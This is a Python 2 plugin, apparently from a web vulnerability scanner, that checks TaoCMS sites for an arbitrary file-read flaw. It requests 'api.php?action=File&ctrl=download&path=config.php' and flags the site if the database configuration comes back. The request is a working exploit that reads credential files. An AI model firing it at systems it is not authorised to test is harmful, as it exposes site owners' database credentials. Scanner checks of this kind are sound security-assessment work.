#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    list = []
    #print "*"*1000
    try:
        domain = ob['domain']
        detail = ''    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"api.php?action=File&ctrl=download&path=config.php")
        res, content = requestUrl(http,expurl,ob['task_id'],ob['domain_id'])
        #print content
        if content.find("define('DB_NAME")>=0:
            request = getRequest(expurl)
            response = getResponse(res)
            list.append(getRecord(ob,expurl,ob['level'],detail,request,response))
            if ob['isstart']=='1':
                detail="验证性扫描结果：\n%s"%content
    except Exception,e:
        logging.getLogger().error("File:TAOCMSREADFILESCRIPT.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:TAOCMSREADFILESCRIPT.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def 